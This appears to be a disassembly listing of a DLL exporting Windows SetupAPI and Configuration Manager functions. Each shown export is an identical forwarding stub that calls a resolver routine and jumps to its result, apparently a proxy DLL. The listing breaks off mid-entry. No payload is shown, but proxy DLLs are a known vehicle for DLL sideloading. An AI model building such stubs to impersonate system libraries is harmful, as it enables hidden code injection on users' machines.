CM_Get_Class_Key_NameW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Class_Key_Name_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Class_Key_Name_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Class_NameA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Class_NameW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Class_Name_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Class_Name_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Class_Registry_PropertyA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Class_Registry_PropertyW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Depth
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Depth_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_DevNode_Custom_PropertyA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_DevNode_Custom_PropertyW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_DevNode_Custom_Property_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_DevNode_Custom_Property_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_DevNode_Registry_PropertyA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_DevNode_Registry_PropertyW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_DevNode_Registry_Property_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_DevNode_Registry_Property_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_DevNode_Status
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_DevNode_Status_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_IDA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_IDW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_ListA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_ListW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_List_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_List_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_List_SizeA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_List_SizeW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_List_Size_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_List_Size_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_Size
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_ID_Size_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_AliasA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_AliasW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_Alias_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_Alias_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_ListA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_ListW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_List_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_List_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_List_SizeA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_List_SizeW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_List_Size_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Device_Interface_List_Size_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_First_Log_Conf
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_First_Log_Conf_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Global_State
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Global_State_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_HW_Prof_FlagsA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_HW_Prof_FlagsW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_HW_Prof_Flags_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_HW_Prof_Flags_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Hardware_Profile_InfoA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Hardware_Profile_InfoW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Hardware_Profile_Info_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Hardware_Profile_Info_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Log_Conf_Priority
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Log_Conf_Priority_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Next_Log_Conf
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Next_Log_Conf_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Next_Res_Des
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Next_Res_Des_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Parent
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Parent_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Res_Des_Data
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Res_Des_Data_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Res_Des_Data_Size
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Res_Des_Data_Size_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Resource_Conflict_Count
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Resource_Conflict_DetailsA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Resource_Conflict_DetailsW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Sibling
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Sibling_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Version
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Version_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Intersect_Range_List
mov ecx r--data
call sub_100013c7
jmp eax
CM_Invert_Range_List
mov ecx r--data
call sub_100013c7
jmp eax
CM_Is_Dock_Station_Present
mov ecx r--data
call sub_100013c7
jmp eax
CM_Is_Dock_Station_Present_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Is_Version_Available
mov ecx r--data
call sub_100013c7
jmp eax
CM_Is_Version_Available_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Locate_DevNodeA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Locate_DevNodeW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Locate_DevNode_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Locate_DevNode_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Merge_Range_List
mov ecx r--data
call sub_100013c7
jmp eax
CM_Modify_Res_Des
mov ecx r--data
call sub_100013c7
jmp eax
CM_Modify_Res_Des_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Move_DevNode
mov ecx r--data
call sub_100013c7
jmp eax
CM_Move_DevNode_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Next_Range
mov ecx r--data
call sub_100013c7
jmp eax
CM_Open_Class_KeyA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Open_Class_KeyW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Open_Class_Key_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Open_Class_Key_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Open_DevNode_Key
mov ecx r--data
call sub_100013c7
jmp eax
CM_Open_DevNode_Key_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_And_Remove_SubTreeA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_And_Remove_SubTreeW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_And_Remove_SubTree_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_And_Remove_SubTree_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_Arbitrator_Free_Data
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_Arbitrator_Free_Data_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_Arbitrator_Free_Size
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_Arbitrator_Free_Size_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_Remove_SubTree
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_Remove_SubTree_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Query_Resource_Conflict_List
mov ecx r--data
call sub_100013c7
jmp eax
CM_Reenumerate_DevNode
mov ecx r--data
call sub_100013c7
jmp eax
CM_Reenumerate_DevNode_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Register_Device_Driver
mov ecx r--data
call sub_100013c7
jmp eax
CM_Register_Device_Driver_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Register_Device_InterfaceA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Register_Device_InterfaceW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Register_Device_Interface_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Register_Device_Interface_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Remove_SubTree
mov ecx r--data
call sub_100013c7
jmp eax
CM_Remove_SubTree_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Request_Device_EjectA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Request_Device_EjectW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Request_Device_Eject_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Request_Device_Eject_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Request_Eject_PC
mov ecx r--data
call sub_100013c7
jmp eax
CM_Request_Eject_PC_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Run_Detection
mov ecx r--data
call sub_100013c7
jmp eax
CM_Run_Detection_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_Class_Registry_PropertyA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_Class_Registry_PropertyW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_DevNode_Problem
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_DevNode_Problem_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_DevNode_Registry_PropertyA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_DevNode_Registry_PropertyW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_DevNode_Registry_Property_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_DevNode_Registry_Property_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_HW_Prof
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_HW_Prof_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_HW_Prof_FlagsA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_HW_Prof_FlagsW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_HW_Prof_Flags_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Set_HW_Prof_Flags_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Setup_DevNode
mov ecx r--data
call sub_100013c7
jmp eax
CM_Setup_DevNode_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Test_Range_Available
mov ecx r--data
call sub_100013c7
jmp eax
CM_Uninstall_DevNode
mov ecx r--data
call sub_100013c7
jmp eax
CM_Uninstall_DevNode_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Unregister_Device_InterfaceA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Unregister_Device_InterfaceW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Unregister_Device_Interface_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Unregister_Device_Interface_ExW
mov ecx r--data
call sub_100013c7
jmp eax
DoesUserHavePrivilege
mov ecx r--data
call sub_100013c7
jmp eax
ExtensionPropSheetPageProc
mov ecx r--data
call sub_100013c7
jmp eax
InstallCatalog
mov ecx r--data
call sub_100013c7
jmp eax
InstallHinfSection
mov ecx r--data
call sub_100013c7
jmp eax
InstallHinfSectionA
mov ecx r--data
call sub_100013c7
jmp eax
InstallHinfSectionW
mov ecx r--data
call sub_100013c7
jmp eax
IsUserAdmin
mov ecx r--data
call sub_100013c7
jmp eax
MyFree
mov ecx r--data
call sub_100013c7
jmp eax
MyMalloc
mov ecx r--data
call sub_100013c7
jmp eax
MyRealloc
mov ecx r--data
call sub_100013c7
jmp eax
SetupAddInstallSectionToDiskSpaceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupAddInstallSectionToDiskSpaceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupAddSectionToDiskSpaceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupAddSectionToDiskSpaceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupAddToDiskSpaceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupAddToDiskSpaceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupAddToSourceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupAddToSourceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupAdjustDiskSpaceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupAdjustDiskSpaceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupBackupErrorA
mov ecx r--data
call sub_100013c7
jmp eax
SetupBackupErrorW
mov ecx r--data
call sub_100013c7
jmp eax
SetupCancelTemporarySourceList
mov ecx r--data
call sub_100013c7
jmp eax
SetupCloseFileQueue
mov ecx r--data
call sub_100013c7
jmp eax
SetupCloseInfFile
mov ecx r--data
call sub_100013c7
jmp eax
SetupCloseLog
mov ecx r--data
call sub_100013c7
jmp eax
SetupCommitFileQueue
mov ecx r--data
call sub_100013c7
jmp eax
SetupCommitFileQueueA
mov ecx r--data
call sub_100013c7
jmp eax
SetupCommitFileQueueW
mov ecx r--data
call sub_100013c7
jmp eax
SetupConfigureWmiFromInfSectionA
mov ecx r--data
call sub_100013c7
jmp eax
SetupConfigureWmiFromInfSectionW
mov ecx r--data
call sub_100013c7
jmp eax
SetupCopyErrorA
mov ecx r--data
call sub_100013c7
jmp eax
SetupCopyErrorW
mov ecx r--data
call sub_100013c7
jmp eax
SetupCopyOEMInfA
mov ecx r--data
call sub_100013c7
jmp eax
SetupCopyOEMInfW
mov ecx r--data
call sub_100013c7
jmp eax
SetupCreateDiskSpaceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupCreateDiskSpaceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDecompressOrCopyFileA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDecompressOrCopyFileW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDefaultQueueCallback
mov ecx r--data
call sub_100013c7
jmp eax
SetupDefaultQueueCallbackA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDefaultQueueCallbackW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDeleteErrorA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDeleteErrorW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDestroyDiskSpaceList
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiAskForOEMDisk
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiBuildClassInfoList
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiBuildClassInfoListExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiBuildClassInfoListExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiBuildDriverInfoList
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCallClassInstaller
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCancelDriverInfoSearch
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiChangeState
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiClassGuidsFromNameA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiClassGuidsFromNameExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiClassGuidsFromNameExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiClassGuidsFromNameW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiClassNameFromGuidA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiClassNameFromGuidExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiClassNameFromGuidExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiClassNameFromGuidW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDevRegKeyA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDevRegKeyW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDeviceInfoA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDeviceInfoList
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDeviceInfoListExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDeviceInfoListExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDeviceInfoW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDeviceInterfaceA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDeviceInterfaceRegKeyA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDeviceInterfaceRegKeyW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiCreateDeviceInterfaceW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiDeleteDevRegKey
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiDeleteDeviceInfo
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiDeleteDeviceInterfaceData
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiDeleteDeviceInterfaceRegKey
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiDestroyClassImageList
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiDestroyDeviceInfoList
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiDestroyDriverInfoList
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiDrawMiniIcon
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiEnumDeviceInfo
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiEnumDeviceInterfaces
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiEnumDriverInfoA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiEnumDriverInfoW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetActualModelsSectionA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetActualModelsSectionW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetActualSectionToInstallA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetActualSectionToInstallExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetActualSectionToInstallExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetActualSectionToInstallW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassBitmapIndex
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassDescriptionA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassDescriptionExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassDescriptionExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassDescriptionW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassDevPropertySheetsA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassDevPropertySheetsW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassDevsA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassDevsExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassDevsExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassDevsW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassImageIndex
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassImageList
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassImageListExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassImageListExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassInstallParamsA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassInstallParamsW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassRegistryPropertyA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetClassRegistryPropertyW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetCustomDevicePropertyA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetCustomDevicePropertyW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceInfoListClass
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceInfoListDetailA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceInfoListDetailW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceInstallParamsA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceInstallParamsW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceInstanceIdA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceInstanceIdW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceInterfaceAlias
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceInterfaceDetailA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceInterfaceDetailW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceRegistryPropertyA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDeviceRegistryPropertyW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDriverInfoDetailA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDriverInfoDetailW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDriverInstallParamsA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetDriverInstallParamsW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetHwProfileFriendlyNameA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetHwProfileFriendlyNameExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetHwProfileFriendlyNameExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetHwProfileFriendlyNameW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetHwProfileList
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetHwProfileListExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetHwProfileListExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetINFClassA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetINFClassW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetSelectedDevice
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetSelectedDriverA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetSelectedDriverW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiGetWizardPage
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiInstallClassA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiInstallClassExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiInstallClassExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiInstallClassW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiInstallDevice
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiInstallDeviceInterfaces
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiInstallDriverFiles
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiLoadClassIcon
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiMoveDuplicateDevice
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiOpenClassRegKey
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiOpenClassRegKeyExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiOpenClassRegKeyExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiOpenDevRegKey
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiOpenDeviceInfoA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiOpenDeviceInfoW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiOpenDeviceInterfaceA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiOpenDeviceInterfaceRegKey
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiOpenDeviceInterfaceW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiRegisterCoDeviceInstallers
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiRegisterDeviceInfo
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiRemoveDevice
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiRemoveDeviceInterface
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiRestartDevices
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSelectBestCompatDrv
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSelectDevice
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSelectOEMDrv
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetClassInstallParamsA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetClassInstallParamsW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetClassRegistryPropertyA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetClassRegistryPropertyW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetDeviceInstallParamsA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetDeviceInstallParamsW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetDeviceInterfaceDefault
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetDeviceRegistryPropertyA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetDeviceRegistryPropertyW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetDriverInstallParamsA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetDriverInstallParamsW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetSelectedDevice
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetSelectedDriverA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiSetSelectedDriverW
mov ecx r--data
call sub_100013c7
jmp eax
SetupDiUnremoveDevice
mov ecx r--data
call sub_100013c7
jmp eax
SetupDuplicateDiskSpaceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupDuplicateDiskSpaceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupEnumInfSectionsA
mov ecx r--data
call sub_100013c7
jmp eax
SetupEnumInfSectionsW
mov ecx r--data
call sub_100013c7
jmp eax
SetupFindFirstLineA
mov ecx r--data
call sub_100013c7
jmp eax
SetupFindFirstLineW
mov ecx r--data
call sub_100013c7
jmp eax
SetupFindNextLine
mov ecx r--data
call sub_100013c7
jmp eax
SetupFindNextMatchLineA
mov ecx r--data
call sub_100013c7
jmp eax
SetupFindNextMatchLineW
mov ecx r--data
call sub_100013c7
jmp eax
SetupFreeSourceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupFreeSourceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetBackupInformationA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetBackupInformationW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetBinaryField
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetFieldCount
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetFileCompressionInfoA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetFileCompressionInfoExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetFileCompressionInfoExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetFileCompressionInfoW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetFileQueueCount
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetFileQueueFlags
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetInfFileListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetInfFileListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetInfInformationA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetInfInformationW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetInfSections
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetIntField
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetLineByIndexA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetLineByIndexW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetLineCountA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetLineCountW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetLineTextA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetLineTextW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetMultiSzFieldA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetMultiSzFieldW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetNonInteractiveMode
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetSourceFileLocationA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetSourceFileLocationW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetSourceFileSizeA
mov ecx r--data
call sub_100013c7
